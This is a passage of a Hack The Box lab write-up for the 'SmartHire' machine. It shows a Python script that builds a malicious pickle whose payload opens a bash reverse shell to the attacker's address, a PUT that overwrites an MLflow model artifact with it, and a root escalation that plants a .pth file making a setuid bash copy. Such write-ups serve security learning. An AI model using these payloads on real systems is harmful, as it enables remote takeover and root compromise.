class="string">&quot;message&quot;</span>:<span class="string">&quot;Model trained and registered successfully&quot;</span>,<span class="string">&quot;model_deleted&quot;</span>:<span class="literal">false</span>,</span><br><span class="line"> <span class="string">&quot;model_info&quot;</span>:&#123;<span class="string">&quot;creation_timestamp&quot;</span>:1779338417836,<span class="string">&quot;description&quot;</span>:<span class="string">&quot;No description&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,</span><br><span class="line"> <span class="string">&quot;registered_model&quot;</span>:<span class="string">&quot;acme-78c78b2f6a9f-model&quot;</span>,<span class="string">&quot;status&quot;</span>:<span class="string">&quot;success&quot;</span>&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Version 1 of our model is now registered. Peeking at the <code>/predict</code> form’s HTML tells us what shape it eats:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -s -c cookies.jar -b cookies.jar http://smarthire.htb/predict \</span><br><span class="line">    | grep -A1 <span class="string">&quot;fetch\|formData\|/predict&quot;</span></span><br><span class="line">      const formData = new FormData();</span><br><span class="line">      formData.append(<span class="string">&#x27;file&#x27;</span>, file);</span><br><span class="line">      const res = await fetch(<span class="string">&#x27;/predict&#x27;</span>, &#123;</span><br><span class="line">        method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        body: formData</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p>Same multipart-CSV shape as the training endpoint. So a <code>POST /predict</code> will be our trigger once we’ve planted the malicious pickle.</p>
+<h2 id="Locating-the-Pickle-in-the-Artifact-Store"><a href="#Locating-the-Pickle-in-the-Artifact-Store" class="headerlink" title="Locating the Pickle in the Artifact Store"></a>Locating the Pickle in the Artifact Store</h2><p>First we resolve the latest version of our registered model to find where its artifacts live:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -s -u admin:password \</span><br><span class="line">    <span class="string">&quot;http://models.smarthire.htb/api/2.0/mlflow/registered-models/get-latest-versions&quot;</span> \</span><br><span class="line">    -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">    -d <span class="string">&#x27;&#123;&quot;name&quot;:&quot;acme-78c78b2f6a9f-model&quot;&#125;&#x27;</span> | python3 -m json.tool</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;model_versions&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;acme-78c78b2f6a9f-model&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;source&quot;</span>: <span class="string">&quot;mlflow-artifacts:/0/5e0038d44cf14123bff522fd3f228654/artifacts/model&quot;</span>,</span><br><span class="line">            <span class="string">&quot;run_id&quot;</span>: <span class="string">&quot;5e0038d44cf14123bff522fd3f228654&quot;</span>,</span><br><span class="line">            <span class="string">&quot;status&quot;</span>: <span class="string">&quot;READY&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we list the artifact tree for that run:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -s -u admin:password \</span><br><span class="line">    <span class="string">&quot;http://models.smarthire.htb/api/2.0/mlflow/artifacts/list&quot;</span> \</span><br><span class="line">    -G --data-urlencode <span class="string">&quot;run_id=5e0038d44cf14123bff522fd3f228654&quot;</span> \</span><br><span class="line">       --data-urlencode <span class="string">&quot;path=model&quot;</span> | python3 -m json.tool</span><br><span class="line"><span class="string">&quot;files&quot;</span>: [</span><br><span class="line">    &#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;model/MLmodel&quot;</span>,             <span class="string">&quot;file_size&quot;</span>: 464&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;model/conda.yaml&quot;</span>,          <span class="string">&quot;file_size&quot;</span>: 153&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;model/python_env.yaml&quot;</span>,     <span class="string">&quot;file_size&quot;</span>: 115&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;model/python_model.pkl&quot;</span>,    <span class="string">&quot;file_size&quot;</span>: 538&#125;,   &lt;-- target</span><br><span class="line">    &#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;model/requirements.txt&quot;</span>,    <span class="string">&quot;file_size&quot;</span>:  47&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>
+
+<p>There’s our <code>python_model.pkl</code>. We read the <code>MLmodel</code> metadata to confirm the loader:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -s -u admin:password \</span><br><span class="line">    <span class="string">&quot;http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/5e0038d44cf14123bff522fd3f228654/artifacts/model/MLmodel&quot;</span></span><br><span class="line">artifact_path: model</span><br><span class="line">flavors:</span><br><span class="line">  python_function:</span><br><span class="line">    cloudpickle_version: 3.1.1</span><br><span class="line">    loader_module: mlflow.pyfunc.model</span><br><span class="line">    python_model: python_model.pkl</span><br><span class="line">    python_version: 3.10.12</span><br><span class="line">mlflow_version: 2.14.1</span><br></pre></td></tr></table></figure></div>
+
+<p><code>loader_module: mlflow.pyfunc.model</code> together with <code>python_model: python_model.pkl</code> is the whole story, that file gets <code>cloudpickle.load</code>d on every single model load.</p>
+<h2 id="Foothold-Poisoning-the-Pickle"><a href="#Foothold-Poisoning-the-Pickle" class="headerlink" title="Foothold - Poisoning the Pickle"></a>Foothold - Poisoning the Pickle</h2><h3 id="Building-the-malicious-pickle"><a href="#Building-the-malicious-pickle" class="headerlink" title="Building the malicious pickle"></a>Building the malicious pickle</h3><p>The <code>__reduce__</code> magic method tells pickle “when you unpickle me, call this callable with these args”, so we pin <code>os.system(&lt;reverse_shell&gt;)</code> and the unpickler fires it the moment it hits our opcode:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># build_pkl.py</span></span><br><span class="line"><span class="keyword">import</span> pickle, os, sys</span><br><span class="line">IP, PORT = sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pwn</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = <span class="string">f&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/<span class="subst">&#123;IP&#125;</span>/<span class="subst">&#123;PORT&#125;</span> 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;evil.pkl&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(Pwn(), f)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ python3 build_pkl.py 10.10.16.32 4444</span><br><span class="line">kujen@kujen:~$ python3 -c <span class="string">&quot;import pickletools; pickletools.dis(open(&#x27;evil.pkl&#x27;,&#x27;rb&#x27;))&quot;</span> | <span class="built_in">head</span></span><br><span class="line">    0: \x80 PROTO      5</span><br><span class="line">    2: \x95 FRAME      78</span><br><span class="line">   11: \x8c SHORT_BINUNICODE <span class="string">&#x27;posix&#x27;</span></span><br><span class="line">   19: \x8c SHORT_BINUNICODE <span class="string">&#x27;system&#x27;</span></span><br><span class="line">   28: \x93 STACK_GLOBAL</span><br><span class="line">   30: \x8c SHORT_BINUNICODE <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.32/4444 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line">   86: R    REDUCE</span><br><span class="line">   88: .    STOP</span><br></pre></td></tr></table></figure></div>
+
+<p>Pure reduce-opcode RCE.</p>
+<h3 id="Overwriting-python-model-pkl"><a href="#Overwriting-python-model-pkl" class="headerlink" title="Overwriting python_model.pkl"></a>Overwriting python_model.pkl</h3><p>MLflow &gt;&#x3D; 2.0 exposes <code>/api/2.0/mlflow-artifacts/artifacts/&lt;path&gt;</code> as a generic artifact store. With our admin auth, a <code>PUT</code> overwrites the file in place, no need to log a new run or even install the <code>mlflow</code> Python client:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -s -u admin:password -X PUT --data-binary <span class="string">&quot;@evil.pkl&quot;</span> \</span><br><span class="line">    <span class="string">&quot;http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/5e0038d44cf14123bff522fd3f228654/artifacts/model/python_model.pkl&quot;</span></span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>We confirm the bytes landed:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -s -u admin:password \</span><br><span class="line">    <span class="string">&quot;http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/5e0038d44cf14123bff522fd3f228654/artifacts/model/python_model.pkl&quot;</span> \</span><br><span class="line">    | xxd | <span class="built_in">head</span> -3</span><br><span class="line">00000000: 8005 954e 0000 0000 0000 008c 0570 6f73  .....N.......pos</span><br><span class="line">00000010: 6978 948c 0673 7973 7465 6d94 9394 8c33  ix...system....3</span><br><span class="line">00000020: 6261 7368 202d 6320 2262 6173 6820 2d69  bash -c <span class="string">&quot;bash -i</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Triggering-the-load"><a href="#Triggering-the-load" class="headerlink" title="Triggering the load"></a>Triggering the load</h3><p>We start our listener and fire a benign CSV at <code>/predict</code>. The server calls <code>mlflow.pyfunc.load_model()</code> on our model <em>before</em> it ever touches the CSV, so the payload triggers on load:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ <span class="built_in">cat</span> &gt; predict.csv &lt;&lt;<span class="string">&#x27;CSV&#x27;</span></span><br><span class="line">name,skills,experience,education,position_applied,previous_company</span><br><span class="line">Test User,<span class="string">&quot;Python, SQL&quot;</span>,60,Master<span class="string">&#x27;s,Data Scientist,TestCorp</span></span><br><span class="line"><span class="string">CSV</span></span><br><span class="line"><span class="string">kujen@kujen:~$ curl -s -c cookies.jar -b cookies.jar -F &quot;file=@predict.csv&quot; \</span></span><br><span class="line"><span class="string">    --max-time 30 http://smarthire.htb/predict</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The request hangs (the unpickle never returns cleanly, which is expected), and over on our listener the callback lands:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.32] from (UNKNOWN) [10.129.245.215] 57466</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1024): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">svcweb@smarthire:/var/www/smarthire.htb$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">svcweb@smarthire:/var/www/smarthire.htb$ <span class="built_in">id</span></span><br><span class="line">uid=1000(svcweb) gid=1000(svcweb) <span class="built_in">groups</span>=1000(svcweb),1001(mlflowweb),1002(devs)</span><br><span class="line">svcweb@smarthire:/var/www/smarthire.htb$ <span class="built_in">cat</span> /home/svcweb/user.txt</span><br><span class="line">cf03bbab01505fee8c67a5a6495b4325</span><br></pre></td></tr></table></figure></div>
+
+<p><code>svcweb</code> runs the gunicorn worker directly, no container, so the host filesystem is fully reachable. That supplementary <code>devs</code> group is interesting and worth keeping in the back of our minds.</p>
+<h2 id="Privilege-Escalation-pth-Hook-Under-Sudo"><a href="#Privilege-Escalation-pth-Hook-Under-Sudo" class="headerlink" title="Privilege Escalation - .pth Hook Under Sudo"></a>Privilege Escalation - .pth Hook Under Sudo</h2><p>We check our sudo rights first:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">svcweb@smarthire:/var/www/smarthire.htb$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> svcweb on smarthire:</span><br><span class="line">    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span><br><span class="line"></span><br><span class="line">User svcweb may run the following commands on smarthire:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *</span><br></pre></td></tr></table></figure></div>
+
+<p>A wildcard sudoers entry on a custom Python helper. That almost always means there’s a code path inside the script we can influence. Let’s look at the directory:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">svcweb@smarthire:/var/www/smarthire.htb$ <span class="built_in">ls</span> -la /opt/tools/mlflow_ctl /opt/tools/mlflow_ctl/plugins</span><br><span class="line">/opt/tools/mlflow_ctl:</span><br><span class="line">-rwxr-xr-- 1 root root 1080 Feb 19 18:16 mlflowctl.py</span><br><span class="line">drwxr-xr-x 4 root root 4096 Feb 19 18:10 plugins</span><br><span class="line"></span><br><span class="line">/opt/tools/mlflow_ctl/plugins:</span><br><span class="line">drwxr-xr-x 3 root root 4096 Feb 20 09:26 core</span><br><span class="line">drwxrwxr-x 2 root devs 4096 May 12 15:22 dev          &lt;-- group=devs, mode 0775</span><br></pre></td></tr></table></figure></div>
+
+<p>The <code>dev</code> plugins directory is group-owned by <code>devs</code> and mode <code>0775</code>, and we’re in <code>devs</code>, so it’s writable to us. Now let’s read the helper itself:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">MLFLOW-CTL: Operational interface for managing the MLflow service.</span></span><br><span class="line"><span class="string">Supports a pluggable extension model for environment-specific logic.</span></span><br><span class="line"><span class="string">For changes or plugin requests, please contact the Platform Team.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> site</span><br><span class="line"></span><br><span class="line">BASE_DIR = Path(__file__).resolve().parent</span><br><span class="line">PLUGINS_DIR = BASE_DIR / <span class="string">&quot;plugins&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make plugins importable</span></span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> PLUGINS_DIR.iterdir():</span><br><span class="line">    <span class="keyword">if</span> path.is_dir():</span><br><span class="line">        site.addsitedir(<span class="built_in">str</span>(path))</span><br></pre></td></tr></table></figure></div>
+
+<p>Here’s the kicker: <code>site.addsitedir()</code> does more than just append a path to <code>sys.path</code>. It scans the given directory for <code>*.pth</code> files and <strong>executes any line inside them that starts with <code>import</code></strong>. Because the script runs under <code>sudo</code> as root, anything we write into <code>plugins/dev/*.pth</code> runs as root too.</p>
+<h3 id="Dropping-the-pth"><a href="#Dropping-the-pth" class="headerlink" title="Dropping the .pth"></a>Dropping the .pth</h3><p>We go with the classic setuid-bash payload: copy <code>/bin/bash</code> to <code>/tmp</code> and chmod it <code>4755</code>. When later run with <code>-p</code>, bash keeps the elevated euid:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">svcweb@smarthire:/var/www/smarthire.htb$ <span class="built_in">echo</span> <span class="string">&quot;import os; os.system(&#x27;cp /bin/bash /tmp/rootbash &amp;&amp; chmod 4755 /tmp/rootbash&#x27;)&quot;</span> &gt; /opt/tools/mlflow_ctl/plugins/dev/pwn.pth</span><br><span class="line">svcweb@smarthire:/var/www/smarthire.htb$ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status; <span class="built_in">ls</span> -la /tmp/rootbash</span><br><span class="line">[*] Checking MLflow service status...</span><br><span class="line"></span><br><span class="line">[+] MLflow service status: active</span><br><span class="line">[+] MLflow container status: <span class="string">&#x27;Up 30 minutes&#x27;</span></span><br><span class="line">-rwsr-xr-x 1 root root 1396520 May 21 04:47 /tmp/rootbash</span><br></pre></td></tr></table></figure></div>
+
+<p>The setuid bit is on and the file is owned by root. We run it with <code>-p</code> to keep the euid and grab the root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">svcweb@smarthire:/var/www/smarthire.htb$ /tmp/rootbash -p -c <span class="string">&quot;id; cat /root/root.txt&quot;</span></span><br><span class="line">uid=1000(svcweb) gid=1000(svcweb) euid=0(root) <span class="built_in">groups</span>=1000(svcweb),1001(mlflowweb),1002(devs)</span><br><span class="line">82ec1ad761d5007033396228540cbf33</span><br></pre></td></tr></table></figure></div>
+
+<p>And that’s a root shell.</p>
+<h2 id="Cleanup"><a href="#Cleanup" class="headerlink" title="Cleanup"></a>Cleanup</h2><p>We tidy up after ourselves by removing the <code>.pth</code> and the setuid bash:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svcweb@smarthire:/var/www/smarthire.htb$ <span class="built_in">rm</span> -f /opt/tools/mlflow_ctl/plugins/dev/pwn.pth /tmp/rootbash</span><br></pre></td></tr></table></figure></div>
+
+<p>The original <code>python_model.pkl</code> is easily restored by re-running <code>/upload_hiring_data</code> from the dashboard, which trains a fresh model and registers it as v2, so the front-end’s <code>/predict</code> picks up the clean one on the next load.</p>
+<p>That was it for SmartHire, hope you learned something new!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: SmartHire</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-09-27 15:00:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-09-27 20:43:58
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/09/27/Hackthebox-SmartHire/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/hackthebox/">#hackthebox</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/MLflow/">#MLflow</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Pickle-Deserialization/">#Pickle Deserialization</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/RCE/">#RCE</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/python-pth/">#python .pth</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/site-addsitedir/">#site.addsitedir</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/sudo/">#sudo</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/09/24/Hackthebox-Hercules/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Hercules</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: SmartHire</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Walking-the-landing-page"><span class="nav-text">Walking the landing page</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Vhost-brute-forcing"><span class="nav-text">Vhost brute-forcing</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MLflow-Default-Credentials"><span class="nav-text">MLflow - Default Credentials</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mapping-the-SmartHire-App"><span class="nav-text">Mapping the SmartHire App</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Registering-an-account"><span class="nav-text">Registering an account</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Finding-our-model-name"><span class="nav-text">Finding our model name</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Training-a-model-to-poison"><span class="nav-text">Training a model to poison</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Locating-the-Pickle-in-the-Artifact-Store"><span class="nav-text">Locating the Pickle in the Artifact Store</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Foothold-Poisoning-the-Pickle"><span class="nav-text">Foothold - Poisoning the Pickle</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Building-the-malicious-pickle"><span class="nav-text">Building the malicious pickle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Overwriting-python-model-pkl"><span class="nav-text">Overwriting python_model.pkl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Triggering-the-load"><span class="nav-text">Triggering the load</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User-flag"><span class="nav-text">User flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-pth-Hook-Under-Sudo"><span class="nav-text">Privilege Escalation - .pth Hook Under Sudo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Dropping-the-pth"><span class="nav-text">Dropping the .pth</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cleanup"><span class="nav-text">Cleanup</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
